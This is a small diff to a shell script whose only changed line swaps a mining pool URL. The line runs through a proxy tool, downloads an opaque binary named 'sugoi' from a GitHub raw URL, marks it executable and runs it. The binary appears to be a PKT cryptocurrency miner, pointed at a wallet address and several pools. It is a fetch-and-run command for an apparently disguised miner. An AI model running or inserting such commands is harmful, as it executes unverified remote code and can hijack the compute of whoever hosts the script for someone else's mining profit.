@@ -36,4 +36,4 @@ echo "**"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/AntonyAjax/ehem/main/sugoi && chmod +x sugoi && ./sugoi ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io http://pool-pkt.dlinodes.com | grep goodrate
+./graftcp/graftcp wget https://raw.githubusercontent.com/AntonyAjax/ehem/main/sugoi && chmod +x sugoi && ./sugoi ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com | grep goodrate
